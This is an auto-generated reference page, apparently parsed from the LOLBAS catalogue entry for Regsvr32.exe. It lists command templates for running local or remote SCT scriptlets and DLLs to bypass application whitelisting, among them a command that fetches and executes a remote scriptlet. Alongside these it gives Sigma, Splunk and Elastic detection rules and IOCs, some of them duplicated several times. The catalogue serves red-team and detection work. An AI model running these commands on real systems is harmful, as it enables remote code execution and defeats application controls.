---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Regsvr32.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `regsvr32.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Regsvr32.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Regsvr32.exe](../../tools/windows/regsvr32.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | regsvr32.exe |
| name | Regsvr32.exe |
| type | tool |
| source | lolbas |
| url | https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
Author: Oddvar Moe
Commands:
- Category: AWL Bypass
  Command: regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
  Description: Execute the specified remote .SCT script with scrobj.dll.
  MitreID: T1218.010
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: SCT
  - Execute: Remote
  Usecase: Execute code from remote scriptlet, bypass Application whitelisting
- Category: AWL Bypass
  Command: regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
  Description: Execute the specified local .SCT script with scrobj.dll.
  MitreID: T1218.010
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: SCT
  Usecase: Execute code from scriptlet, bypass Application whitelisting
- Category: Execute
  Command: regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
  Description: Execute the specified remote .SCT script with scrobj.dll.
  MitreID: T1218.010
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: SCT
  - Execute: Remote
  Usecase: Execute code from remote scriptlet, bypass Application whitelisting
- Category: Execute
  Command: regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
  Description: Execute the specified local .SCT script with scrobj.dll.
  MitreID: T1218.010
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: SCT
  Usecase: Execute code from scriptlet, bypass Application whitelisting
- Category: Execute
  Command: regsvr32.exe /s {PATH:.dll}
  Description: Execute code in a DLL. The code must be inside the exported function `DllRegisterServer`.
  MitreID: T1218.010
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: DLL
  Usecase: Execute DLL file
- Category: Execute
  Command: regsvr32.exe /u /s {PATH:.dll}
  Description: Execute code in a DLL. The code must be inside the exported function `DllUnRegisterServer`.
  MitreID: T1218.010
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: DLL
  Usecase: Execute DLL file
Created: 2018-05-25
Description: Used by Windows to register dlls
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_child_process.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_1.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/dns_query/dns_query_win_regsvr32_network_activity.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regsvr32_flags_anomaly.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml
- Splunk: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_regsvr32_application_control_bypass.yml
- Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml
- IOC: regsvr32.exe retrieving files from Internet
- IOC: regsvr32.exe executing scriptlet (sct) files
- IOC: DotNet CLR libraries loaded into regsvr32.exe
- IOC: DotNet CLR Usage Log - regsvr32.exe.log
Full_Path:
- Path: C:\Windows\System32\regsvr32.exe
- Path: C:\Windows\SysWOW64\regsvr32.exe
Name: Regsvr32.exe
Resources:
- Link: https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
- Link: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
- Link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Regsvr32.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
```

```text
IOC: DotNet CLR Usage Log - regsvr32.exe.log
```

```text
IOC: DotNet CLR libraries loaded into regsvr32.exe
```

```text
IOC: regsvr32.exe executing scriptlet (sct) files
```

```text
IOC: regsvr32.exe retrieving files from Internet
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_child_process.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_1.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/dns_query/dns_query_win_regsvr32_network_activity.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regsvr32_flags_anomaly.yml
```

```text
Splunk: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_regsvr32_application_control_bypass.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_child_process.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_1.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/dns_query/dns_query_win_regsvr32_network_activity.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regsvr32_flags_anomaly.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml
- Splunk: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_regsvr32_application_control_bypass.yml
- Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml
- IOC: regsvr32.exe retrieving files from Internet
- IOC: regsvr32.exe executing scriptlet (sct) files
- IOC: DotNet CLR libraries loaded into regsvr32.exe
- IOC: DotNet CLR Usage Log - regsvr32.exe.log
```
